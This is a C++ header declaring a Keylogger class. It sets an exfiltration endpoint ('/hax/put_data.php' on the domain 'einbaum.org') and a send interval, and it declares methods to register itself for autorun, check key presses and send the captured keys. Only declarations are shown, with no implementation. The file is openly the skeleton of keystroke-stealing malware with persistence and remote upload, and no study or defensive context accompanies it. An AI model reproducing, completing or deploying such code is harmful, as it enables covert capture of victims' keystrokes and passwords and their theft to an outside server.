#pragma once
#include "stdafx.h"

#define V_NET_FILE "/hax/put_data.php"
#define V_NET_DOMAIN "einbaum.org"

const int V_SEND_INTERVAL = 10000;
const int V_IDLE_TIME = 1;

class Keylogger
{
public:
	Keylogger();
	~Keylogger();
    
    void RegisterAutorun();
	void Run();
private:

    void CheckKey(short vkey, bool shift);
    void Send();

    std::vector<const char*> keysPressed;
    bool keysActive[256 + 1];
    char cmdBuf[4096];
};